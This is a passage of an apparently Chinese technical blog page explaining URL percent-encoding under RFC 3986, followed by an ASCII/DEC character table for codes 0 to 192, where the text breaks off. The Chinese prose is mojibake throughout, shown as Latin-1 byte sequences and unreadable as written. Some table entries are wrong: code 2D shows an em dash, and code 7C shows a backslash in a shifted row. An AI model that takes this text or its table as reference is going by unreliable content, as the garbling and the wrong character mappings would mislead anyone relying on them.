</td><td><strong>Q</strong></td><td><strong>Q</strong></td><td><strong>=</strong></td><td><strong>=</strong></td><td></td><td></td><td><strong>Q</strong></td><td><strong>K</strong></td><td><strong>M</strong></td><td><strong>=</strong></td></tr></tbody></table></div><h3 id="8ã€URLç¼–ç "><a href="#8ã€URLç¼–ç " class="headerlink" title="8ã€URLç¼–ç "></a>8ã€URLç¼–ç </h3><h4 id="1ï¼‰Urlç¼–ç å‰ç½®çŸ¥è¯†"><a href="#1ï¼‰Urlç¼–ç å‰ç½®çŸ¥è¯†" class="headerlink" title="1ï¼‰Urlç¼–ç å‰ç½®çŸ¥è¯†"></a>1ï¼‰Urlç¼–ç å‰ç½®çŸ¥è¯†</h4><p><strong>Urlç¼–ç çš„åŸåˆ™</strong>å°±æ˜¯ä½¿ç”¨<strong>å®‰å…¨çš„å­—ç¬¦</strong>ï¼ˆæ²¡æœ‰ç‰¹æ®Šç”¨é€”æˆ–è€…ç‰¹æ®Šæ„ä¹‰çš„å¯æ‰“å°å­—ç¬¦ï¼‰å»è¡¨ç¤ºé‚£äº›<strong>ä¸å®‰å…¨çš„å­—ç¬¦</strong>ã€‚</p><ul><li><p><strong>RFC3986æ–‡æ¡£</strong>è§„å®šï¼ŒUrlä¸­åªå…è®¸åŒ…å«<strong>è‹±æ–‡å­—æ¯ï¼ˆa-zã€A-Zï¼‰ã€æ•°å­—ï¼ˆ0-9ï¼‰ã€-_.~4ä¸ªç‰¹æ®Šå­—ç¬¦ä»¥åŠæ‰€æœ‰ä¿ç•™å­—ç¬¦</strong>ã€‚</p><blockquote><p>RFC3986æ–‡æ¡£å¯¹Urlçš„ç¼–è§£ç é—®é¢˜åšå‡ºäº†è¯¦ç»†çš„å»ºè®®ï¼ŒæŒ‡å‡ºäº†å“ªäº›å­—ç¬¦éœ€è¦è¢«ç¼–ç æ‰ä¸ä¼šå¼•èµ·Urlè¯­ä¹‰çš„è½¬å˜ï¼Œä»¥åŠå¯¹ä¸ºä»€ä¹ˆè¿™äº›å­—ç¬¦éœ€è¦ç¼–ç åšå‡ºäº†ç›¸åº”çš„è§£é‡Šã€‚</p></blockquote></li><li><p>ä¿ç•™å­—ç¬¦ï¼šUrlå¯ä»¥åˆ’åˆ†æˆè‹¥å¹²ä¸ªç»„ä»¶ï¼Œåè®®ã€ä¸»æœºã€è·¯å¾„ç­‰ã€‚æœ‰ä¸€äº›å­—ç¬¦ï¼ˆ<strong>:/?#[]@</strong>ï¼‰æ˜¯ç”¨ä½œåˆ†éš”ä¸åŒç»„ä»¶çš„ã€‚RFC3986ä¸­æŒ‡å®šäº†ä»¥ä¸‹å­—ç¬¦ä¸ºä¿ç•™å­—ç¬¦ï¼š<strong>! * â€˜ ( ) ; : @ &amp; = + $ , / ? # [ ]</strong></p><blockquote><p>ä¾‹å¦‚:å†’å·ç”¨äºåˆ†éš”åè®®å’Œä¸»æœºï¼Œ/ç”¨äºåˆ†éš”ä¸»æœºå’Œè·¯å¾„ï¼Œ?ç”¨äºåˆ†éš”è·¯å¾„å’ŒæŸ¥è¯¢å‚æ•°ï¼Œç­‰ç­‰ã€‚</p><p>è¿˜æœ‰ä¸€äº›å­—ç¬¦ï¼ˆ!$&amp;â€™()*+,;=ï¼‰ç”¨äºåœ¨æ¯ä¸ªç»„ä»¶ä¸­èµ·åˆ°åˆ†éš”ä½œç”¨çš„ï¼Œå¦‚=ç”¨äºè¡¨ç¤ºæŸ¥è¯¢å‚æ•°ä¸­çš„é”®å€¼å¯¹ï¼Œ&amp;ç¬¦å·ç”¨äºåˆ†éš”æŸ¥è¯¢å¤šä¸ªé”®å€¼å¯¹ã€‚å½“ç»„ä»¶ä¸­çš„æ™®é€šæ•°æ®åŒ…å«è¿™äº›ç‰¹æ®Šå­—ç¬¦æ—¶ï¼Œéœ€è¦å¯¹å…¶è¿›è¡Œç¼–ç ã€‚</p></blockquote></li><li><p>ä¸å®‰å…¨å­—ç¬¦ï¼šè¿˜æœ‰ä¸€äº›å­—ç¬¦ï¼Œå½“ä»–ä»¬ç›´æ¥æ”¾åœ¨Urlä¸­çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šå¼•èµ·è§£æç¨‹åºçš„æ­§ä¹‰ï¼Œè¿™äº›å­—ç¬¦è¢«è§†ä¸ºä¸å®‰å…¨å­—ç¬¦ã€‚</p><ul><li>ç©ºæ ¼ï¼šUrlåœ¨ä¼ è¾“çš„è¿‡ç¨‹ï¼Œæˆ–è€…ç”¨æˆ·åœ¨æ’ç‰ˆçš„è¿‡ç¨‹ï¼Œæˆ–è€…æ–‡æœ¬å¤„ç†ç¨‹åºåœ¨å¤„ç†Urlçš„è¿‡ç¨‹ï¼Œéƒ½æœ‰å¯èƒ½å¼•å…¥æ— å…³ç´§è¦çš„ç©ºæ ¼ï¼Œæˆ–è€…å°†é‚£äº›æœ‰æ„ä¹‰çš„ç©ºæ ¼ç»™å»æ‰ã€‚</li><li>å¼•å·ä»¥åŠ&lt;&gt;ï¼šå¼•å·å’Œå°–æ‹¬å·é€šå¸¸ç”¨äºåœ¨æ™®é€šæ–‡æœ¬ä¸­èµ·åˆ°åˆ†éš”Urlçš„ä½œç”¨</li><li><h1 id="ï¼šé€šå¸¸ç”¨äºè¡¨ç¤ºä¹¦ç­¾æˆ–è€…é”šç‚¹"><a href="#ï¼šé€šå¸¸ç”¨äºè¡¨ç¤ºä¹¦ç­¾æˆ–è€…é”šç‚¹" class="headerlink" title="ï¼šé€šå¸¸ç”¨äºè¡¨ç¤ºä¹¦ç­¾æˆ–è€…é”šç‚¹"></a>ï¼šé€šå¸¸ç”¨äºè¡¨ç¤ºä¹¦ç­¾æˆ–è€…é”šç‚¹</h1></li><li>%ï¼šç™¾åˆ†å·æœ¬èº«ç”¨ä½œå¯¹ä¸å®‰å…¨å­—ç¬¦è¿›è¡Œç¼–ç æ—¶ä½¿ç”¨çš„ç‰¹æ®Šå­—ç¬¦ï¼Œå› æ­¤æœ¬èº«éœ€è¦ç¼–ç </li><li>{}|\^[]`~ï¼šæŸä¸€äº›ç½‘å…³æˆ–è€…ä¼ è¾“ä»£ç†ä¼šç¯¡æ”¹è¿™äº›å­—ç¬¦</li></ul></li><li><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹äºUrlä¸­çš„åˆæ³•å­—ç¬¦ï¼Œç¼–ç å’Œä¸ç¼–ç æ˜¯ç­‰ä»·çš„ï¼Œä½†æ˜¯å¯¹äºä¸Šé¢æåˆ°çš„è¿™äº›å­—ç¬¦ï¼Œå¦‚æœä¸ç»è¿‡ç¼–ç ï¼Œé‚£ä¹ˆå®ƒä»¬æœ‰å¯èƒ½ä¼šé€ æˆUrlè¯­ä¹‰çš„ä¸åŒã€‚å› æ­¤å¯¹äºUrlè€Œè¨€ï¼Œåªæœ‰æ™®é€š<strong>è‹±æ–‡å­—ç¬¦å’Œæ•°å­—ï¼Œç‰¹æ®Šå­—ç¬¦$-_.+!*â€™()è¿˜æœ‰ä¿ç•™å­—ç¬¦</strong>ï¼Œæ‰èƒ½å‡ºç°åœ¨æœªç»ç¼–ç çš„Urlä¹‹ä¸­ã€‚å…¶ä»–å­—ç¬¦å‡éœ€è¦ç»è¿‡ç¼–ç ä¹‹åæ‰èƒ½å‡ºç°åœ¨Urlä¸­ã€‚</p></li><li>ç°åœ¨å·²ç»æˆä¸ºä¸€ç§è§„èŒƒäº†ï¼ŒåŸºæœ¬æ‰€æœ‰ç¨‹åºè¯­è¨€éƒ½æœ‰è¿™ç§ç¼–ç ï¼Œå¦‚<strong>PHPæœ‰ urlencodeã€urldecode</strong>ç­‰ã€‚</li></ul><h4 id="2ï¼‰å¦‚ä½•è¿›è¡Œç¼–ç "><a href="#2ï¼‰å¦‚ä½•è¿›è¡Œç¼–ç " class="headerlink" title="2ï¼‰å¦‚ä½•è¿›è¡Œç¼–ç "></a>2ï¼‰å¦‚ä½•è¿›è¡Œç¼–ç </h4><ul><li><p>Urlç¼–ç ä½¿ç”¨%ï¼ˆç™¾åˆ†å·ï¼‰åŠ åå…­è¿›åˆ¶ã€‚Urlç¼–ç é»˜è®¤ä½¿ç”¨çš„å­—ç¬¦é›†æ˜¯ASCIIã€‚</p><blockquote><p>ä¾‹å¦‚ç¬¦å·#åœ¨ASCIIå­—ç¬¦é›†ä¸­å¯¹åº”çš„å­—èŠ‚ä¸º0x23ï¼Œç»è¿‡Urlç¼–ç ä¹‹åå¾—åˆ°çš„æ˜¯%23ã€‚</p></blockquote></li><li><p>å¯¹äºéASCIIå­—ç¬¦ï¼Œéœ€è¦ä½¿ç”¨ASCIIå­—ç¬¦é›†çš„è¶…é›†è¿›è¡Œç¼–ç å¾—åˆ°ç›¸åº”çš„å­—èŠ‚ï¼Œç„¶åå¯¹æ¯ä¸ªå­—èŠ‚æ‰§è¡Œç™¾åˆ†å·ç¼–ç ã€‚</p><blockquote><p>å¯¹äºUnicodeå­—ç¬¦ï¼ŒRFCæ–‡æ¡£å»ºè®®ä½¿ç”¨utf-8å¯¹å…¶è¿›è¡Œç¼–ç å¾—åˆ°ç›¸åº”çš„å­—èŠ‚ï¼Œç„¶åå¯¹æ¯ä¸ªå­—èŠ‚æ‰§è¡Œç™¾åˆ†å·ç¼–ç ã€‚</p><p>å¦‚â€ä¸­æ–‡â€ä½¿ç”¨UTF-8å­—ç¬¦é›†å¾—åˆ°çš„å­—èŠ‚ä¸º0xE4 0xB8 0xAD 0xE6 0x96 0x87ï¼Œç»è¿‡Urlç¼–ç ä¹‹ååˆ°â€%E4%B8%AD%E6%96%87â€ã€‚</p></blockquote></li><li><p>å¦‚æœæŸä¸ªå­—èŠ‚å¯¹åº”ç€ASCIIå­—ç¬¦é›†ä¸­çš„æŸä¸ªéä¿ç•™å­—ç¬¦ï¼Œåˆ™æ­¤å­—èŠ‚æ— éœ€ä½¿ç”¨ç™¾åˆ†å·è¡¨ç¤ºã€‚</p><blockquote><p>ä¾‹å¦‚â€Urlç¼–ç â€ï¼Œä½¿ç”¨UTF-8ç¼–ç å¾—åˆ°çš„å­—èŠ‚æ˜¯0x55 0x72 0x6C 0xE7 0xBC 0x96 0xE7 0xA0 0x81ï¼Œç”±äºå‰ä¸‰ä¸ªå­—èŠ‚å¯¹åº”ç€ASCIIä¸­çš„éä¿ç•™å­—ç¬¦â€Urlâ€ï¼Œå› æ­¤è¿™ä¸‰ä¸ªå­—èŠ‚å¯ä»¥ç”¨éä¿ç•™å­—ç¬¦â€Urlâ€è¡¨ç¤ºã€‚æœ€ç»ˆçš„Urlç¼–ç å¯ä»¥ç®€åŒ–æˆâ€Url%E7%BC%96%E7%A0%81â€ ï¼Œå½“ç„¶ï¼Œå¦‚æœä½ ç”¨â€%55%72%6C%E7%BC%96%E7%A0%81â€ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p></blockquote></li></ul><h4 id="3ï¼‰ASCIIç å¯¹ç…§è¡¨0-255ï¼š"><a href="#3ï¼‰ASCIIç å¯¹ç…§è¡¨0-255ï¼š" class="headerlink" title="3ï¼‰ASCIIç å¯¹ç…§è¡¨0-255ï¼š"></a>3ï¼‰ASCIIç å¯¹ç…§è¡¨0-255ï¼š</h4><div class="table-container"><table><thead><tr><th><strong>åè¿›åˆ¶ä»£ç </strong></th><th><strong>åå…­è¿›åˆ¶ä»£ç </strong></th><th><strong>MCS å­—ç¬¦æˆ–ç¼©å†™</strong></th><th><strong>DEC å¤šå›½å­—ç¬¦å</strong></th></tr></thead><tbody><tr><td><strong>ASCII æ§åˆ¶å­—ç¬¦ 1</strong></td><td></td><td></td><td></td></tr><tr><td>0</td><td>0</td><td>NUL</td><td>ç©ºå­—ç¬¦</td></tr><tr><td>1</td><td>1</td><td>SOH</td><td>æ ‡é¢˜èµ·å§‹ (Ctrl/A)</td></tr><tr><td>2</td><td>2</td><td>STX</td><td>æ–‡æœ¬èµ·å§‹ (Ctrl/B)</td></tr><tr><td>3</td><td>3</td><td>ETX</td><td>æ–‡æœ¬ç»“æŸ (Ctrl/C)</td></tr><tr><td>4</td><td>4</td><td>EOT</td><td>ä¼ è¾“ç»“æŸ (Ctrl/D)</td></tr><tr><td>5</td><td>5</td><td>ENQ</td><td>è¯¢é—® (Ctrl/E)</td></tr><tr><td>6</td><td>6</td><td>ACK</td><td>è®¤å¯ (Ctrl/F)</td></tr><tr><td>7</td><td>7</td><td>BEL</td><td>é“ƒ (Ctrl/G)</td></tr><tr><td>8</td><td>8</td><td>BS</td><td>é€€æ ¼ (Ctrl/H)</td></tr><tr><td>9</td><td>9</td><td>HT</td><td>æ°´å¹³åˆ¶è¡¨æ  (Ctrl/I)</td></tr><tr><td>10</td><td>0A</td><td>LF</td><td>æ¢è¡Œ (Ctrl/J)</td></tr><tr><td>11</td><td>0B</td><td>VT</td><td>å‚ç›´åˆ¶è¡¨æ  (Ctrl/K)</td></tr><tr><td>12</td><td>0C</td><td>FF</td><td>æ¢é¡µ (Ctrl/L)</td></tr><tr><td>13</td><td>0D</td><td>CR</td><td>å›è½¦ (Ctrl/M)</td></tr><tr><td>14</td><td>0E</td><td>SO</td><td>ç§»å‡º (Ctrl/N)</td></tr><tr><td>15</td><td>0F</td><td>SI</td><td>ç§»å…¥ (Ctrl/O)</td></tr><tr><td>16</td><td>10</td><td>DLE</td><td>æ•°æ®é“¾æ¥ä¸¢å¤± (Ctrl/P)</td></tr><tr><td>17</td><td>11</td><td>DC1</td><td>è®¾å¤‡æ§åˆ¶ 1 (Ctrl/Q)</td></tr><tr><td>18</td><td>12</td><td>DC2</td><td>è®¾å¤‡æ§åˆ¶ 2 (Ctrl/R)</td></tr><tr><td>19</td><td>13</td><td>DC3</td><td>è®¾å¤‡æ§åˆ¶ 3 (Ctrl/S)</td></tr><tr><td>20</td><td>14</td><td>DC4</td><td>è®¾å¤‡æ§åˆ¶ 4 (Ctrl/T)</td></tr><tr><td>21</td><td>15</td><td>NAK</td><td>å¦å®šæ¥å— (Ctrl/U)</td></tr><tr><td>22</td><td>16</td><td>SYN</td><td>åŒæ­¥é—²ç½®ç¬¦ (Ctrl/V)</td></tr><tr><td>23</td><td>17</td><td>ETB</td><td>ä¼ è¾“å—ç»“æŸ (Ctrl/W)</td></tr><tr><td>24</td><td>18</td><td>CAN</td><td>å–æ¶ˆ (Ctrl/X)</td></tr><tr><td>25</td><td>19</td><td>EM</td><td>åª’ä½“ç»“æŸ (Ctrl/Y)</td></tr><tr><td>26</td><td>1A</td><td>SUB</td><td>æ›¿æ¢ (Ctrl/Z)</td></tr><tr><td>27</td><td>1B</td><td>ESC</td><td>æ¢ç ç¬¦</td></tr><tr><td>28</td><td>1C</td><td>FS</td><td>æ–‡ä»¶åˆ†éš”ç¬¦</td></tr><tr><td>29</td><td>1D</td><td>GS</td><td>ç»„åˆ†éš”ç¬¦</td></tr><tr><td>30</td><td>1E</td><td>RS</td><td>è®°å½•åˆ†éš”ç¬¦</td></tr><tr><td>31</td><td>1F</td><td>US</td><td>å•ä½åˆ†éš”ç¬¦</td></tr><tr><td><strong>ASCII ç‰¹æ®Šå’Œæ•°å­—å­—ç¬¦</strong></td><td></td><td></td><td></td></tr><tr><td>32</td><td>20</td><td>SP</td><td>ç©ºæ ¼</td></tr><tr><td>33</td><td>21</td><td>!</td><td>æ„Ÿå¹å·</td></tr><tr><td>34</td><td>22</td><td>â€œ</td><td>å¼•å· (åŒå¼•å·)</td></tr><tr><td>35</td><td>23</td><td>#</td><td>æ•°å­—ç¬¦å·</td></tr><tr><td>36</td><td>24</td><td>$</td><td>ç¾å…ƒç¬¦</td></tr><tr><td>37</td><td>25</td><td>%</td><td>ç™¾åˆ†å·</td></tr><tr><td>38</td><td>26</td><td>&amp;</td><td>å’Œå·</td></tr><tr><td>39</td><td>27</td><td>â€˜</td><td>çœç•¥å· (å•å¼•å·)</td></tr><tr><td>40</td><td>28</td><td>(</td><td>å·¦åœ†æ‹¬å·</td></tr><tr><td>41</td><td>29</td><td>)</td><td>å³åœ†æ‹¬å·</td></tr><tr><td>42</td><td>2A</td><td>*</td><td>æ˜Ÿå·</td></tr><tr><td>43</td><td>2B</td><td>+</td><td>åŠ å·</td></tr><tr><td>44</td><td>2C</td><td>,</td><td>é€—å·</td></tr><tr><td>45</td><td>2D</td><td>â€”</td><td>è¿å­—å·æˆ–å‡å·</td></tr><tr><td>46</td><td>2E</td><td>.</td><td>å¥ç‚¹æˆ–å°æ•°ç‚¹</td></tr><tr><td>47</td><td>2F</td><td>/</td><td>æ–œæ </td></tr><tr><td>48</td><td>30</td><td>0</td><td>é›¶</td></tr><tr><td>49</td><td>31</td><td>1</td><td>1</td></tr><tr><td>50</td><td>32</td><td>2</td><td>2</td></tr><tr><td>51</td><td>33</td><td>3</td><td>3</td></tr><tr><td>52</td><td>34</td><td>4</td><td>4</td></tr><tr><td>53</td><td>35</td><td>5</td><td>5</td></tr><tr><td>54</td><td>36</td><td>6</td><td>6</td></tr><tr><td>55</td><td>37</td><td>7</td><td>7</td></tr><tr><td>56</td><td>38</td><td>8</td><td>8</td></tr><tr><td>57</td><td>39</td><td>9</td><td>9</td></tr><tr><td>58</td><td>3A</td><td>:</td><td>å†’å·</td></tr><tr><td>59</td><td>3B</td><td>;</td><td>åˆ†å·</td></tr><tr><td>60</td><td>3C</td><td>&lt;</td><td>å°äº</td></tr><tr><td>61</td><td>3D</td><td>=</td><td>ç­‰äº</td></tr><tr><td>62</td><td>3E</td><td>&gt;</td><td>å¤§äº</td></tr><tr><td>63</td><td>3F</td><td>?</td><td>é—®å·</td></tr><tr><td><strong>ASCII å­—æ¯å­—ç¬¦</strong></td><td></td><td></td><td></td></tr><tr><td>64</td><td>40</td><td>@</td><td>å•†ä¸š at ç¬¦å·</td></tr><tr><td>65</td><td>41</td><td>A</td><td>å¤§å†™å­—æ¯ A</td></tr><tr><td>66</td><td>42</td><td>B</td><td>å¤§å†™å­—æ¯ B</td></tr><tr><td>67</td><td>43</td><td>C</td><td>å¤§å†™å­—æ¯ C</td></tr><tr><td>68</td><td>44</td><td>D</td><td>å¤§å†™å­—æ¯ D</td></tr><tr><td>69</td><td>45</td><td>E</td><td>å¤§å†™å­—æ¯ E</td></tr><tr><td>70</td><td>46</td><td>F</td><td>å¤§å†™å­—æ¯ F</td></tr><tr><td>71</td><td>47</td><td>G</td><td>å¤§å†™å­—æ¯ G</td></tr><tr><td>72</td><td>48</td><td>H</td><td>å¤§å†™å­—æ¯ H</td></tr><tr><td>73</td><td>49</td><td>I</td><td>å¤§å†™å­—æ¯ I</td></tr><tr><td>74</td><td>4A</td><td>J</td><td>å¤§å†™å­—æ¯ J</td></tr><tr><td>75</td><td>4B</td><td>K</td><td>å¤§å†™å­—æ¯ K</td></tr><tr><td>76</td><td>4C</td><td>L</td><td>å¤§å†™å­—æ¯ L</td></tr><tr><td>77</td><td>4D</td><td>M</td><td>å¤§å†™å­—æ¯ M</td></tr><tr><td>78</td><td>4E</td><td>N</td><td>å¤§å†™å­—æ¯ N</td></tr><tr><td>79</td><td>4F</td><td>O</td><td>å¤§å†™å­—æ¯ O</td></tr><tr><td>80</td><td>50</td><td>P</td><td>å¤§å†™å­—æ¯ P</td></tr><tr><td>81</td><td>51</td><td>Q</td><td>å¤§å†™å­—æ¯ Q</td></tr><tr><td>82</td><td>52</td><td>R</td><td>å¤§å†™å­—æ¯ R</td></tr><tr><td>83</td><td>53</td><td>S</td><td>å¤§å†™å­—æ¯ S</td></tr><tr><td>84</td><td>54</td><td>T</td><td>å¤§å†™å­—æ¯ T</td></tr><tr><td>85</td><td>55</td><td>U</td><td>å¤§å†™å­—æ¯ U</td></tr><tr><td>86</td><td>56</td><td>V</td><td>å¤§å†™å­—æ¯ V</td></tr><tr><td>87</td><td>57</td><td>W</td><td>å¤§å†™å­—æ¯ W</td></tr><tr><td>88</td><td>58</td><td>X</td><td>å¤§å†™å­—æ¯ X</td></tr><tr><td>89</td><td>59</td><td>Y</td><td>å¤§å†™å­—æ¯ Y</td></tr><tr><td>90</td><td>5A</td><td>Z</td><td>å¤§å†™å­—æ¯ Z</td></tr><tr><td>91</td><td>5B</td><td>[</td><td>å·¦ä¸­æ‹¬å·</td></tr><tr><td>92</td><td>5C</td><td>\</td><td>åæ–œæ </td></tr><tr><td>93</td><td>5D</td><td>]</td><td>å³ä¸­æ‹¬å·</td></tr><tr><td>94</td><td>5E</td><td>^</td><td>éŸ³è°ƒç¬¦å·</td></tr><tr><td>95</td><td>5F</td><td>_</td><td>ä¸‹åˆ’çº¿</td></tr><tr><td>96</td><td>60</td><td>`</td><td>é‡éŸ³ç¬¦</td></tr><tr><td>97</td><td>61</td><td>a</td><td>å°å†™å­—æ¯ a</td></tr><tr><td>98</td><td>62</td><td>b</td><td>å°å†™å­—æ¯ b</td></tr><tr><td>99</td><td>63</td><td>c</td><td>å°å†™å­—æ¯ c</td></tr><tr><td>100</td><td>64</td><td>d</td><td>å°å†™å­—æ¯ d</td></tr><tr><td>101</td><td>65</td><td>e</td><td>å°å†™å­—æ¯ e</td></tr><tr><td>102</td><td>66</td><td>f</td><td>å°å†™å­—æ¯ f</td></tr><tr><td>103</td><td>67</td><td>g</td><td>å°å†™å­—æ¯ g</td></tr><tr><td>104</td><td>68</td><td>h</td><td>å°å†™å­—æ¯ h</td></tr><tr><td>105</td><td>69</td><td>i</td><td>å°å†™å­—æ¯ i</td></tr><tr><td>106</td><td>6A</td><td>j</td><td>å°å†™å­—æ¯ j</td></tr><tr><td>107</td><td>6B</td><td>k</td><td>å°å†™å­—æ¯ k</td></tr><tr><td>108</td><td>6C</td><td>l</td><td>å°å†™å­—æ¯ l</td></tr><tr><td>109</td><td>6D</td><td>m</td><td>å°å†™å­—æ¯ m</td></tr><tr><td>110</td><td>6E</td><td>n</td><td>å°å†™å­—æ¯ n</td></tr><tr><td>111</td><td>6F</td><td>o</td><td>å°å†™å­—æ¯ o</td></tr><tr><td>112</td><td>70</td><td>p</td><td>å°å†™å­—æ¯ p</td></tr><tr><td>113</td><td>71</td><td>q</td><td>å°å†™å­—æ¯ q</td></tr><tr><td>114</td><td>72</td><td>r</td><td>å°å†™å­—æ¯ r</td></tr><tr><td>115</td><td>73</td><td>s</td><td>å°å†™å­—æ¯ s</td></tr><tr><td>116</td><td>74</td><td>t</td><td>å°å†™å­—æ¯ t</td></tr><tr><td>117</td><td>75</td><td>u</td><td>å°å†™å­—æ¯ u</td></tr><tr><td>118</td><td>76</td><td>v</td><td>å°å†™å­—æ¯ v</td></tr><tr><td>119</td><td>77</td><td>w</td><td>å°å†™å­—æ¯ w</td></tr><tr><td>120</td><td>78</td><td>x</td><td>å°å†™å­—æ¯ x</td></tr><tr><td>121</td><td>79</td><td>y</td><td>å°å†™å­—æ¯ y</td></tr><tr><td>122</td><td>7A</td><td>z</td><td>å°å†™å­—æ¯ z</td></tr><tr><td>123</td><td>7B</td><td>{</td><td>å·¦å¤§æ‹¬å·</td></tr><tr><td>124</td><td>7C</td><td>\</td><td></td><td>å‚ç›´çº¿</td></tr><tr><td>125</td><td>7D</td><td>}</td><td>å³å¤§æ‹¬å· (ALTMODE)</td></tr><tr><td>126</td><td>7E</td><td>~</td><td>ä»£å­—å· (ALTMODE)</td></tr><tr><td>127</td><td>7F</td><td>DEL</td><td>æ“¦æ‰ (DELETE)</td></tr><tr><td><strong>æ§åˆ¶å­—ç¬¦</strong></td><td></td><td></td><td></td></tr><tr><td>128</td><td>80</td><td></td><td>[ä¿ç•™]</td></tr><tr><td>129</td><td>81</td><td></td><td>[ä¿ç•™]</td></tr><tr><td>130</td><td>82</td><td></td><td>[ä¿ç•™]</td></tr><tr><td>131</td><td>83</td><td></td><td>[ä¿ç•™]</td></tr><tr><td>132</td><td>84</td><td>IND</td><td>ç´¢å¼•</td></tr><tr><td>133</td><td>85</td><td>NEL</td><td>ä¸‹ä¸€è¡Œ</td></tr><tr><td>134</td><td>86</td><td>SSA</td><td>è¢«é€‰åŒºåŸŸèµ·å§‹</td></tr><tr><td>135</td><td>87</td><td>ESA</td><td>è¢«é€‰åŒºåŸŸç»“æŸ</td></tr><tr><td>136</td><td>88</td><td>HTS</td><td>æ°´å¹³åˆ¶è¡¨ç¬¦é›†</td></tr><tr><td>137</td><td>89</td><td>HTJ</td><td>å¯¹é½çš„æ°´å¹³åˆ¶è¡¨ç¬¦é›†</td></tr><tr><td>138</td><td>8A</td><td>VTS</td><td>å‚ç›´åˆ¶è¡¨ç¬¦é›†</td></tr><tr><td>139</td><td>8B</td><td>PLD</td><td>éƒ¨åˆ†è¡Œå‘ä¸‹</td></tr><tr><td>140</td><td>8C</td><td>PLU</td><td>éƒ¨åˆ†è¡Œå‘ä¸Š</td></tr><tr><td>141</td><td>8D</td><td>RI</td><td>åå‘ç´¢å¼•</td></tr><tr><td>142</td><td>8E</td><td>SS2</td><td>å•ç§» 2</td></tr><tr><td>143</td><td>8F</td><td>SS3</td><td>å•ç§» 3</td></tr><tr><td>144</td><td>90</td><td>DCS</td><td>è®¾å¤‡æ§åˆ¶å­—ç¬¦ä¸²</td></tr><tr><td>145</td><td>91</td><td>PU1</td><td>ä¸“ç”¨ 1</td></tr><tr><td>146</td><td>92</td><td>PU2</td><td>ä¸“ç”¨ 2</td></tr><tr><td>147</td><td>93</td><td>STS</td><td>è®¾ç½®ä¼ è¾“çŠ¶æ€</td></tr><tr><td>148</td><td>94</td><td>CCH</td><td>å–æ¶ˆå­—ç¬¦</td></tr><tr><td>149</td><td>95</td><td>MW</td><td>æ¶ˆæ¯ç­‰å¾…</td></tr><tr><td>150</td><td>96</td><td>SPA</td><td>ä¿æŠ¤åŒºèµ·å§‹</td></tr><tr><td>151</td><td>97</td><td>EPA</td><td>ä¿æŠ¤åŒºç»“æŸ</td></tr><tr><td>152</td><td>98</td><td></td><td>[ä¿ç•™]</td></tr><tr><td>153</td><td>99</td><td></td><td>[ä¿ç•™]</td></tr><tr><td>154</td><td>9A</td><td></td><td>[ä¿ç•™]</td></tr><tr><td>155</td><td>9B</td><td>CSI</td><td>æ§åˆ¶åºåˆ—å¼•å¯¼ç¬¦</td></tr><tr><td>156</td><td>9C</td><td>ST</td><td>å­—ç¬¦ä¸²ç»ˆæ­¢ç¬¦</td></tr><tr><td>157</td><td>9D</td><td>OSC</td><td>æ“ä½œç³»ç»Ÿå‘½ä»¤</td></tr><tr><td>158</td><td>9E</td><td>PM</td><td>ç§˜å¯†æ¶ˆæ¯</td></tr><tr><td>159</td><td>9F</td><td>APC</td><td>åº”ç”¨ç¨‹åº</td></tr><tr><td><strong>å…¶ä»–å­—ç¬¦</strong></td><td></td><td></td><td></td></tr><tr><td>160</td><td>A0</td><td></td><td>[ä¿ç•™] 2</td></tr><tr><td>161</td><td>A1</td><td>Â¡</td><td>åå‘æ„Ÿå¹å·</td></tr><tr><td>162</td><td>A2</td><td>Â¢</td><td>åˆ†å¸ç¬¦</td></tr><tr><td>163</td><td>A3</td><td>Â£</td><td>è‹±ç£…ç¬¦</td></tr><tr><td>164</td><td>A4</td><td></td><td>[ä¿ç•™] 2</td></tr><tr><td>165</td><td>A5</td><td>Â¥</td><td>äººæ°‘å¸ç¬¦</td></tr><tr><td>166</td><td>A6</td><td></td><td>[ä¿ç•™] 2</td></tr><tr><td>167</td><td>A7</td><td>Â§</td><td>ç« èŠ‚ç¬¦</td></tr><tr><td>168</td><td>A8</td><td>Â¤</td><td>é€šç”¨è´§å¸ç¬¦å· 2</td></tr><tr><td>169</td><td>A9</td><td>Â©</td><td>ç‰ˆæƒç¬¦å·</td></tr><tr><td>170</td><td>AA</td><td>Âª</td><td>é˜´æ€§é¡ºåºæŒ‡ç¤ºç¬¦</td></tr><tr><td>171</td><td>AB</td><td>Â«</td><td>å·¦è§’å¼•å·</td></tr><tr><td>172</td><td>AC</td><td></td><td>[ä¿ç•™] 2</td></tr><tr><td>173</td><td>AD</td><td></td><td>[ä¿ç•™] 2</td></tr><tr><td>174</td><td>AE</td><td></td><td>[ä¿ç•™] 2</td></tr><tr><td>175</td><td>AF</td><td></td><td>[ä¿ç•™] 2</td></tr><tr><td>176</td><td>B0</td><td>Â°</td><td>æ¸©åº¦ç¬¦</td></tr><tr><td>177</td><td>B1</td><td>Â±</td><td>åŠ /å‡å·</td></tr><tr><td>178</td><td>B2</td><td>Â²</td><td>ä¸Šæ ‡ 2</td></tr><tr><td>179</td><td>B3</td><td>Â³</td><td>ä¸Šæ ‡ 3</td></tr><tr><td>180</td><td>B4</td><td></td><td>[ä¿ç•™] 2</td></tr><tr><td>181</td><td>B5</td><td>Âµ</td><td>å¾®ç¬¦</td></tr><tr><td>182</td><td>B6</td><td>Â¶</td><td>æ®µè½ç¬¦ï¼Œpilcrow</td></tr><tr><td>183</td><td>B7</td><td>Â·</td><td>ä¸­ç‚¹</td></tr><tr><td>184</td><td>B8</td><td></td><td>[ä¿ç•™] 2</td></tr><tr><td>185</td><td>B9</td><td>Â¹</td><td>ä¸Šæ ‡ 1</td></tr><tr><td>186</td><td>BA</td><td>Âº</td><td>é˜³æ€§é¡ºåºæŒ‡ç¤ºç¬¦</td></tr><tr><td>187</td><td>BB</td><td>Â»</td><td>å³è§’å¼•å·</td></tr><tr><td>188</td><td>BC</td><td>Â¼</td><td>åˆ†æ•°å››åˆ†ä¹‹ä¸€</td></tr><tr><td>189</td><td>BD</td><td>Â½</td><td>åˆ†æ•°äºŒåˆ†ä¹‹ä¸€</td></tr><tr><td>190</td><td>BE</td><td></td><td>[ä¿ç•™] 2</td></tr><tr><td>191</td><td>BF</td><td>Â¿</td><td>åå‘é—®å·</td></tr><tr><td>192</td><td>C0</td><td>Ã€</td><td>å¸¦é‡éŸ³ç¬¦çš„å¤§å†™å­—æ¯ 